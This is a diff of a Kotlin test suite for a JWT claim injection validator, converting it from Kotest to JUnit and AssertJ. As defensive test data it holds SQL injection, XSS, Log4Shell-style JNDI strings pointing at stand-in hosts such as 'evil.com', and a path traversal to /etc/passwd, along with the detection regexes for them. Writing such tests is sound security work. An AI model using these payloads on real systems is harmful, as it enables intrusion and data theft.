@@ -1,233 +1,277 @@
 package com.axians.eaf.framework.security.validation
 
-import com.axians.eaf.framework.security.InjectionDetectedException
 import com.axians.eaf.framework.security.InjectionDetector
-import io.kotest.core.spec.style.FunSpec
-import io.kotest.matchers.shouldBe
-import io.kotest.matchers.string.shouldContain
 import io.micrometer.core.instrument.simple.SimpleMeterRegistry
-import org.springframework.security.oauth2.core.OAuth2TokenValidatorResult
+import org.assertj.core.api.Assertions.assertThat
+import org.junit.jupiter.api.Test
 import org.springframework.security.oauth2.jwt.Jwt
 import java.time.Instant
 
 /**
- * Unit tests for JwtInjectionValidator (Layer 10: Injection Detection).
+ * Unit tests for JwtInjectionValidator - Layer 10 of 10-layer JWT validation system.
  *
- * Tests validate that JWT claims are scanned for malicious injection patterns
- * including SQL injection, XSS, JNDI injection, Expression Injection, and
- * Path Traversal attacks. Uses InjectionDetector for comprehensive pattern matching.
+ * Validates JWT claims against injection attack patterns (SQL injection, XSS, JNDI, Expression
+ * Injection, Path Traversal) to prevent malicious payloads embedded in Keycloak claims from
+ * reaching application code. Final defense layer before token acceptance.
  *
- * Story 3.8: User Validation and Injection Detection (Layers 9-10)
+ * **Test Coverage:**
+ * - Safe claims acceptance (normal user data passes)
+ * - SQL injection detection (e.g., `' OR 1=1 --`)
+ * - XSS injection detection (e.g., `<script>alert('xss')</script>`)
+ * - JNDI injection detection (e.g., `ldap://malicious.com`, Log4Shell-style)
+ * - Expression injection detection (e.g., `${jndi:ldap://evil.com}`)
+ * - Path traversal detection (e.g., `../../../etc/passwd`)
+ * - Non-string claim handling (lists, maps, numbers ignored)
+ * - Safe special characters (O'Connor, user+tag@example.com)
+ * - Multiple injection patterns (fails on first detected pattern)
+ *
+ * **Security Patterns:**
+ * - Defense-in-depth (final validation layer before token acceptance)
+ * - OWASP Injection attack prevention (SQL, XSS, JNDI, Expression, Path Traversal)
+ * - Log4Shell protection (JNDI pattern detection)
+ * - Fail-closed validation (detected injection = rejection)
+ * - Pattern-based detection (regex matching for known attack signatures)
+ * - String claim focus (non-string claims bypass injection checks)
+ *
+ * **Testing Strategy:**
+ * - InjectionDetector pattern matching (shared with input validation)
+ * - Comprehensive attack vector coverage (OWASP Top 10 relevant patterns)
+ * - False positive prevention (safe special characters must pass)
+ * - SimpleMeterRegistry for metrics validation
+ *
+ * **Acceptance Criteria:**
+ * - Story 3.8: Injection pattern detection in JWT claims
+ * - Story 3.8: SQL injection, XSS, JNDI, Expression Injection, Path Traversal detection
+ *
+ * @see JwtInjectionValidator Primary class under test
+ * @see InjectionDetector Pattern matching engine
+ * @since JUnit 6 Migration (2025-11-20)
+ * @author EAF Testing Framework
  */
-class JwtInjectionValidatorTest :
-    FunSpec({
-        val injectionDetector = InjectionDetector()
-        val validator = JwtInjectionValidator(injectionDetector, SimpleMeterRegistry())
+class JwtInjectionValidatorTest {
+    private val injectionDetector = InjectionDetector()
+    private val validator = JwtInjectionValidator(injectionDetector, SimpleMeterRegistry())
 
-        test("valid JWT with safe claims should pass validation") {
-            val jwt =
-                createJwt(
-                    claims =
-                        mapOf(
-                            "sub" to "user-123",
-                            "iss" to "https://keycloak.example.com/realms/eaf",
-                            "aud" to "eaf-api",
-                            "exp" to Instant.now().plusSeconds(3600),
-                            "iat" to Instant.now(),
-                            "name" to "John Doe",
-                            "email" to "john.doe@example.com",
-                            "tenant_id" to "tenant-a",
-                            "roles" to listOf("WIDGET_ADMIN"),
-                        ),
-                )
+    @Test
+    fun `valid JWT with safe claims should pass validation`() {
+        val jwt =
+            createJwt(
+                claims =
+                    mapOf(
+                        "sub" to "user-123",
+                        "iss" to "https://keycloak.example.com/realms/eaf",
+                        "aud" to "eaf-api",
+                        "exp" to Instant.now().plusSeconds(3600),
+                        "iat" to Instant.now(),
+                        "name" to "John Doe",
+                        "email" to "john.doe@example.com",
+                        "tenant_id" to "tenant-a",
+                        "roles" to listOf("WIDGET_ADMIN"),
+                    ),
+            )
 
-            val result = validator.validate(jwt)
+        val result = validator.validate(jwt)
 
-            result.hasErrors() shouldBe false
-        }
+        assertThat(result.hasErrors()).isFalse()
+    }
 
-        test("JWT with SQL injection in sub claim should fail validation") {
-            val jwt =
-                createJwt(
-                    claims =
-                        mapOf(
-                            "sub" to "user'; DROP TABLE users; --",
-                            "iss" to "https://keycloak.example.com/realms/eaf",
-                            "aud" to "eaf-api",
-                            "exp" to Instant.now().plusSeconds(3600),
-                            "iat" to Instant.now(),
-                        ),
-                )
+    @Test
+    fun `JWT with SQL injection in sub claim should fail validation`() {
+        val jwt =
+            createJwt(
+                claims =
+                    mapOf(
+                        "sub" to "user'; DROP TABLE users; --",
+                        "iss" to "https://keycloak.example.com/realms/eaf",
+                        "aud" to "eaf-api",
+                        "exp" to Instant.now().plusSeconds(3600),
+                        "iat" to Instant.now(),
+                    ),
+            )
 
-            val result = validator.validate(jwt)
+        val result = validator.validate(jwt)
 
-            result.hasErrors() shouldBe true
-            result.errors.first().errorCode shouldBe "invalid_request"
-            result.errors.first().description shouldBe
-                "JWT claim contains potential injection pattern: Potential injection detected in claim 'sub': " +
-                "pattern=(?i).*(--).*"
-        }
+        assertThat(result.hasErrors()).isTrue()
+        assertThat(result.errors.first().errorCode).isEqualTo("invalid_request")
+        assertThat(result.errors.first().description).isEqualTo(
+            "JWT claim contains potential injection pattern: Potential injection detected in claim 'sub': " +
+                "pattern=(?i).*(--).*",
+        )
+    }
 
-        test("JWT with XSS injection in name claim should fail validation") {
-            val jwt =
-                createJwt(
-                    claims =
-                        mapOf(
-                            "sub" to "user-123",
-                            "iss" to "https://keycloak.example.com/realms/eaf",
-                            "aud" to "eaf-api",
-                            "exp" to Instant.now().plusSeconds(3600),
-                            "iat" to Instant.now(),
-                            "name" to "<script>alert('xss')</script>",
-                        ),
-                )
+    @Test
+    fun `JWT with XSS injection in name claim should fail validation`() {
+        val jwt =
+            createJwt(
+                claims =
+                    mapOf(
+                        "sub" to "user-123",
+                        "iss" to "https://keycloak.example.com/realms/eaf",
+                        "aud" to "eaf-api",
+                        "exp" to Instant.now().plusSeconds(3600),
+                        "iat" to Instant.now(),
+                        "name" to "<script>alert('xss')</script>",
+                    ),
+            )
 
-            val result = validator.validate(jwt)
+        val result = validator.validate(jwt)
 
-            result.hasErrors() shouldBe true
-            result.errors.first().errorCode shouldBe "invalid_request"
-            result.errors.first().description shouldContain "JWT claim contains potential injection pattern"
-        }
+        assertThat(result.hasErrors()).isTrue()
+        assertThat(result.errors.first().errorCode).isEqualTo("invalid_request")
+        assertThat(result.errors.first().description).contains("JWT claim contains potential injection pattern")
+    }
 
-        test("JWT with JNDI injection in email claim should fail validation") {
-            val jwt =
-                createJwt(
-                    claims =
-                        mapOf(
-                            "sub" to "user-123",
-                            "iss" to "https://keycloak.example.com/realms/eaf",
-                            "aud" to "eaf-api",
-                            "exp" to Instant.now().plusSeconds(3600),
-                            "iat" to Instant.now(),
-                            "email" to "user@ldap://malicious.com",
-                        ),
-                )
+    @Test
+    fun `JWT with JNDI injection in email claim should fail validation`() {
+        val jwt =
+            createJwt(
+                claims =
+                    mapOf(
+                        "sub" to "user-123",
+                        "iss" to "https://keycloak.example.com/realms/eaf",
+                        "aud" to "eaf-api",
+                        "exp" to Instant.now().plusSeconds(3600),
+                        "iat" to Instant.now(),
+                        "email" to "user@ldap://malicious.com",
+                    ),
+            )
 
-            val result = validator.validate(jwt)
+        val result = validator.validate(jwt)
 
-            result.hasErrors() shouldBe true
-            result.errors.first().errorCode shouldBe "invalid_request"
-            result.errors.first().description shouldBe
-                "JWT claim contains potential injection pattern: Potential injection detected in claim 'email': " +
-                "pattern=(?i).*(jndi:|ldap:|rmi:).*"
-        }
+        assertThat(result.hasErrors()).isTrue()
+        assertThat(result.errors.first().errorCode).isEqualTo("invalid_request")
+        assertThat(result.errors.first().description).isEqualTo(
+            "JWT claim contains potential injection pattern: Potential injection detected in claim 'email': " +
+                "pattern=(?i).*(jndi:|ldap:|rmi:).*",
+        )
+    }
 
-        test("JWT with Expression Injection in custom claim should fail validation") {
-            val jwt =
-                createJwt(
-                    claims =
-                        mapOf(
-                            "sub" to "user-123",
-                            "iss" to "https://keycloak.example.com/realms/eaf",
-                            "aud" to "eaf-api",
-                            "exp" to Instant.now().plusSeconds(3600),
-                            "iat" to Instant.now(),
-                            "custom_data" to "\${jndi:ldap://evil.com}",
-                        ),
-                )
+    @Test
+    fun `JWT with Expression Injection in custom claim should fail validation`() {
+        val jwt =
+            createJwt(
+                claims =
+                    mapOf(
+                        "sub" to "user-123",
+                        "iss" to "https://keycloak.example.com/realms/eaf",
+                        "aud" to "eaf-api",
+                        "exp" to Instant.now().plusSeconds(3600),
+                        "iat" to Instant.now(),
+                        "custom_data" to "\${jndi:ldap://evil.com}",
+                    ),
+            )
 
-            val result = validator.validate(jwt)
+        val result = validator.validate(jwt)
 
-            result.hasErrors() shouldBe true
-            result.errors.first().errorCode shouldBe "invalid_request"
-            result.errors.first().description shouldContain "JWT claim contains potential injection pattern"
-        }
+        assertThat(result.hasErrors()).isTrue()
+        assertThat(result.errors.first().errorCode).isEqualTo("invalid_request")
+        assertThat(result.errors.first().description).contains("JWT claim contains potential injection pattern")
+    }
 
-        test("JWT with Path Traversal in file_path claim should fail validation") {
-            val jwt =
-                createJwt(
-                    claims =
-                        mapOf(
-                            "sub" to "user-123",
-                            "iss" to "https://keycloak.example.com/realms/eaf",
-                            "aud" to "eaf-api",
-                            "exp" to Instant.now().plusSeconds(3600),
-                            "iat" to Instant.now(),
-                            "file_path" to "../../../etc/passwd",
-                        ),
-                )
+    @Test
+    fun `JWT with Path Traversal in file_path claim should fail validation`() {
+        val jwt =
+            createJwt(
+                claims =
+                    mapOf(
+                        "sub" to "user-123",
+                        "iss" to "https://keycloak.example.com/realms/eaf",
+                        "aud" to "eaf-api",
+                        "exp" to Instant.now().plusSeconds(3600),
+                        "iat" to Instant.now(),
+                        "file_path" to "../../../etc/passwd",
+                    ),
+            )
 
-            val result = validator.validate(jwt)
+        val result = validator.validate(jwt)
 
-            result.hasErrors() shouldBe true
-            result.errors.first().errorCode shouldBe "invalid_request"
-            result.errors.first().description shouldBe
-                "JWT claim contains potential injection pattern: Potential injection detected in claim 'file_path': " +
-                "pattern=.*(\\.\\.[\\\\/]).*"
-        }
+        assertThat(result.hasErrors()).isTrue()
+        assertThat(result.errors.first().errorCode).isEqualTo("invalid_request")
+        assertThat(result.errors.first().description).isEqualTo(
+            "JWT claim contains potential injection pattern: Potential injection detected in claim 'file_path': " +
+                "pattern=.*(\\.\\.[\\\\/]).*",
+        )
+    }
 
-        test("JWT with multiple injection patterns should fail on first detected pattern") {
-            val jwt =
-                createJwt(
-                    claims =
-                        mapOf(
-                            "sub" to "user-123",
-                            "iss" to "https://keycloak.example.com/realms/eaf",
-                            "aud" to "eaf-api",
-                            "exp" to Instant.now().plusSeconds(3600),
-                            "iat" to Instant.now(),
-                            "name" to "<script>alert('xss')</script>",
-                            "email" to "user@ldap://malicious.com",
-                            // This would be second pattern, but should not reach here
-                        ),
-                )
+    @Test
+    fun `JWT with multiple injection patterns should fail on first detected pattern`() {
+        val jwt =
+            createJwt(
+                claims =
+                    mapOf(
+                        "sub" to "user-123",
+                        "iss" to "https://keycloak.example.com/realms/eaf",
+                        "aud" to "eaf-api",
+                        "exp" to Instant.now().plusSeconds(3600),
+                        "iat" to Instant.now(),
+                        "name" to "<script>alert('xss')</script>",
+                        "email" to "user@ldap://malicious.com",
+                        // This would be second pattern, but should not reach here
+                    ),
+            )
 
-            val result = validator.validate(jwt)
+        val result = validator.validate(jwt)
 
-            result.hasErrors() shouldBe true
-            // Should fail on the first detected pattern (name claim matches XSS pattern due to "<script>")
+        assertThat(result.hasErrors()).isTrue()
+        // Should fail on the first detected pattern (name claim matches XSS pattern due to "<script>")
+        assertThat(
             result.errors
                 .first()
                 .description
-                .contains("name") shouldBe true
+                .contains("name"),
+        ).isTrue()
+        assertThat(
             result.errors
                 .first()
                 .description
-                .contains("<script") shouldBe true
-        }
+                .contains("<script"),
+        ).isTrue()
+    }
 
-        test("JWT with non-string claims should be ignored by injection detection") {
-            val jwt =
-                createJwt(
-                    claims =
-                        mapOf(
-                            "sub" to "user-123",
-                            "iss" to "https://keycloak.example.com/realms/eaf",
-                            "aud" to "eaf-api",
-                            "exp" to Instant.now().plusSeconds(3600),
-                            "iat" to Instant.now(),
-                            "roles" to listOf("ADMIN", "USER"), // List, not String
-                            "permissions" to mapOf("read" to true, "write" to false), // Map, not String
-                            "count" to 42, // Number, not String
-                        ),
-                )
+    @Test
+    fun `JWT with non-string claims should be ignored by injection detection`() {
+        val jwt =
+            createJwt(
+                claims =
+                    mapOf(
+                        "sub" to "user-123",
+                        "iss" to "https://keycloak.example.com/realms/eaf",
+                        "aud" to "eaf-api",
+                        "exp" to Instant.now().plusSeconds(3600),
+                        "iat" to Instant.now(),
+                        "roles" to listOf("ADMIN", "USER"), // List, not String
+                        "permissions" to mapOf("read" to true, "write" to false), // Map, not String
+                        "count" to 42, // Number, not String
+                    ),
+            )
 
-            val result = validator.validate(jwt)
+        val result = validator.validate(jwt)
 
-            result.hasErrors() shouldBe false
-        }
+        assertThat(result.hasErrors()).isFalse()
+    }
 
-        test("JWT with safe special characters should pass validation") {
-            val jwt =
-                createJwt(
-                    claims =
-                        mapOf(
-                            "sub" to "user-123",
-                            "iss" to "https://keycloak.example.com/realms/eaf",
-                            "aud" to "eaf-api",
-                            "exp" to Instant.now().plusSeconds(3600),
-                            "iat" to Instant.now(),
-                            "name" to "O'Connor-Smith", // Safe apostrophe
-                            "email" to "user+tag@example.com", // Safe plus sign
-                            "description" to "Item #1: 100% complete", // Safe percent, hash, colon
-                        ),
-                )
+    @Test
+    fun `JWT with safe special characters should pass validation`() {
+        val jwt =
+            createJwt(
+                claims =
+                    mapOf(
+                        "sub" to "user-123",
+                        "iss" to "https://keycloak.example.com/realms/eaf",
+                        "aud" to "eaf-api",
+                        "exp" to Instant.now().plusSeconds(3600),
+                        "iat" to Instant.now(),
+                        "name" to "O'Connor-Smith", // Safe apostrophe
+                        "email" to "user+tag@example.com", // Safe plus sign
+                        "description" to "Item #1: 100% complete", // Safe percent, hash, colon
+                    ),
+            )
 
-            val result = validator.validate(jwt)
+        val result = validator.validate(jwt)
 
-            result.hasErrors() shouldBe false
-        }
-    })
+        assertThat(result.hasErrors()).isFalse()
+    }
+}
 
 /**
  * Helper function to create a test JWT with specified claims.
